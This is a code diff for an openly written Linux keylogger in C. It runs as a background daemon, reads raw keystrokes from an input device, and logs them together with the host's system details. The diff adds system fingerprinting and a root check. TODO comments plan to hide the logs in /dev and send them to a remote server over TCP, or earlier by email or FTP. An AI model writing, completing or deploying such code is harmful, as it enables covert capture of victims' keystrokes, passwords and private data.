@@ -1,13 +1,6 @@
-/*
-* ADD SLEEP
-* ADD ERROR IF USER IS NOT ROOT
-* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
-* ONCE FILE REACHES A CERTAIN SIZE-->EMAIL
-* IF STATEMENT--->SEND LOG FILE VIA EMAIL
-* ELSE ERROR--->UPLOAD VIA FTP
-*/
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <sys/utsname.h>
 #include <linux/input.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -16,18 +9,18 @@
 #include <time.h>
 #include <fcntl.h>
 
-// #include "keymap.h"
 
 int main(void) {
 	FILE *fp = NULL;
 	FILE *evlog;
+	struct utsname unameData;
+	uname(&unameData);
 	int fd;
 	pid_t process_id = 0;
 	pid_t sid = 0;
 	struct input_event ev;			/* using input_event so we know 
 									 * what we're reading from the 
 									 * event file */
-
 	process_id = fork();			/* fork a child process */
 
 	if (process_id < 0) {
@@ -47,16 +40,25 @@ int main(void) {
 	if (sid < 0) {
 		exit(1);
 	}
-
+	// CHANGE DIRECTORY TO DEV WHEN DONE
 	chdir("log/");					/* change daemon working 
-									 * directory to ROOT */
+									 * directory to /dev */
 	close(STDIN_FILENO);
 	close(STDOUT_FILENO);
 	close(STDERR_FILENO);
 
 	fp = fopen("log.txt", "a+"); 		/* daemon log */
 	evlog = fopen("evlog.txt", "a+");  	/* key log */
-	fd = open("/dev/input/event2", O_RDONLY|O_TRUNC|O_NONBLOCK);	/* key event file */
+	fd = open("/dev/input/event2", O_RDONLY|O_NONBLOCK);	/* key event file */
+/*
+* ADD SLEEP
+* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
+* Send file out via TCP to python server for translation
+*/
+	if (geteuid() != 0) {								/* check if user is root */
+		fprintf(fp, "ERROR: user not root");
+		return 1;
+	}
 
 	time_t curtime;
 	time(&curtime);
@@ -66,10 +68,13 @@ int main(void) {
 		return 1;
 	}
 
-	fprintf(evlog, "\n\n%s-", ctime(&curtime));
+	fprintf(evlog, "\n\n%s", ctime(&curtime));		/* timestamp */
+	fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 	/* system data */
+			unameData.nodename, unameData.version,
+			unameData.sysname, unameData.release, 
+			unameData.machine);
 
 	while(1) {
-		// sleep(1); 	MUST ADD SLEEP!!!!!
 		fflush(fp);
 
 		read(fd, &ev, sizeof(struct input_event));
@@ -77,6 +82,9 @@ int main(void) {
 			fprintf(evlog, "%i,%i-", ev.code, ev.value);
 			fflush(evlog);
 		}
+		// else if(ev.type == 0) {
+		// 	sleep(1); 	// MUST ADD SLEEP!!!!!
+		// }
 	}
 
 	fclose(evlog);
